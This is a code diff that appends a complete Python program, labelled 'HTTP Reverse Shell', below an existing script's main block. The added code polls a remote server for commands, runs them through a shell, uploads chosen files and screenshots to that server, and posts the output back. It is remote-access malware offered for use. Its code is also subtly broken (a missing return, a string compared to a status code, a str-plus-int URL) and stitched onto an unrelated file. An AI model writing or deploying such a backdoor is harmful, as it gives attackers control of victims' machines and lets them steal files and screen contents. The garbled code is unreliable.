@@ -69,3 +69,78 @@ if __name__ == "__main__":
     
     args = parser.parse_args()
     main(args.url)
+import argparse
+import sys
+import os
+import time
+from PIL import ImageGrab
+import tempfile
+import requests
+import subprocess
+
+
+def parse_arguments():
+    parser = argparse.ArgumentParser(description="HTTP Reverse Shell")
+    parser.add_argument("host", help="Hostname or ip of Server")
+    parser.add_argument("port", help="Serever Port")
+
+
+def uploadFile(url, directory):
+    try:
+        with open(directory, "rb") as file:
+            response = requests.post(url, files={"file": file})
+            if response.status_code == "200":
+                print("[+] File Uploaded Successfully")
+            else:
+                print("[-] Failed to upload File")
+    except Exception as e:
+        sys.stderr.write("[~] Error: {}".format(str(e)))
+
+
+def screenCapture(url):
+    with tempfile.TemporaryDirectory() as dirpath:
+        screenshotPath = os.path.join(dirpath, "img.jpg")
+        ImageGrab.grab().save(screenshotPath, "JPEG")
+        uploadFile(url, screenshotPath)
+
+
+def executeCommand(command, url):
+    process = subprocess.Popen(
+        command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+    )
+    output, error = process.communicate()
+    if output:
+        requests.post(url, data=output)
+    elif error:
+        requests.post(url, data=error)
+
+
+def connect(host, port):
+    if host and port:
+        url = "http://" + host + int(port)
+        while True:
+            response = requests.get(url)
+            command = response.text.strip()
+            if "exit" in command:
+                break
+            elif "grab" in command:
+                _, directory = command.split(" ", 1)
+                if os.path.exists(directory):
+                    uploadFile(url, directory)
+                else:
+                    requests.post(url, data="[-] Not able to find file")
+            elif "screencap" in command:
+                screenCapture(url)
+            else:
+                executeCommand(command, url)
+
+            time.sleep(3)
+
+
+def main():
+    args = parse_arguments()
+    connect(args.host, args.port)
+
+
+if __name__ == "__main__":
+    main()
